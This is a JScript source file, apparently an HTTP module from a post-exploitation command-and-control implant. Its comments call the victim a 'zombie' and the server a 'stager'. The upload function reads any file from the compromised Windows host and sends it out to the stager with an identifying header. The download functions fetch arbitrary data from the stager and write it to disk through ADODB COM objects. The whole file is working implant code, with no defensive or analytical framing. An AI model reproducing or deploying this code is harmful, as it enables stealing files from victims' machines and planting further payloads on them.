////////////////////////////////////////////////////////////////////////
// HTTP API
////////////////////////////////////////////////////////////////////////
var scope = {
    VERSIONINFO: "HTTP Module (http.js) version 0.1",
    global: global,
	require: global.require
};

var LIB = require('lib/std');

scope.create = function() {
    var http = null;

    try {
        http = LIB.CreateObject("Microsoft.XMLHTTP");
    } catch (e) {
        http = LIB.CreateObject("WinHttp.WinHttpRequest.5.1");
        http.setTimeouts(30000, 30000, 30000, 0)
    }

    return http;
}

scope.addHeaders = function(http, headers) {
    var headers = (typeof(headers) !== "undefined") ? headers : {};

    var content = false;
    for (var key in headers) {
        var value = headers[key];

        http.setRequestHeader(key, value);
        if (key.toUpperCase() == "CONTENT-TYPE")
            content = true;
    }

    if (!content)
        http.setRequestHeader("Content-Type", "application/octet-stream");
};

scope.post = function(url, data, headers) {
    var data = (typeof(data) !== "undefined") ? data : "";

    var http = scope.create();

    http.open("POST", url, false);
    scope.addHeaders(http, headers);
    http.send(data);

    return http;
};

scope.get = function(url, headers) {
    var http = scope.create();
    http.open("GET", url, false);
    scope.addHeaders(http, headers);
    http.send();

    return http;
};

/**
 * Upload a file, off zombie, to stager
 *
 * @param filepath - the full path to the file to send
 * @param header_uuid - a unique identifier for this file
 * @param header_key - optional HTTP header tag to send uuid over
 *
 * @return object - the HTTP object
 *
 **/
scope.upload = function(filepath, header_uuid, header_key) {
    var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";

    var data = $.file.readBinary(filepath);

    // we must replace null bytes or MS will cut off the body
    data = data.replace(/\\/g, "\\\\");
    data = data.replace(/\0/g, "\\0");

    var headers = {};
    headers[key] = header_uuid;

    return $.work.report(data, headers);
};

scope.download = function(filepath, header_uuid, header_key) {
    var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";

    var headers = {};
    headers[key] = header_uuid;

    return scope.downloadEx("POST", $.work.make_url(), headers, filepath);
};

scope.downloadEx = function(verb, url, headers, path) {
    if (verb == "GET") {
        var http = scope.get(url, headers);
    } else {
        var http = scope.post(url, "", headers);
    }

    var stream = LIB.CreateObject("Adodb.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(http.responseBody);

    var data = scope.bin2str(stream);
    $.file.write(path, data);
};

scope.bin2str = function(stream) {
    stream.Flush();
    stream.Position = 0;

    var bin = stream.Read();
    var rs = LIB.CreateObject("Adodb.RecordSet");
    rs.Fields.Append("temp", 201, stream.Size);

    rs.Open();
    rs.AddNew();
    rs("temp").AppendChunk(bin);
    rs.Update();
    var data = rs.GetString();
    rs.Close();
    return data.substring(0, data.length - 1);
};

return scope;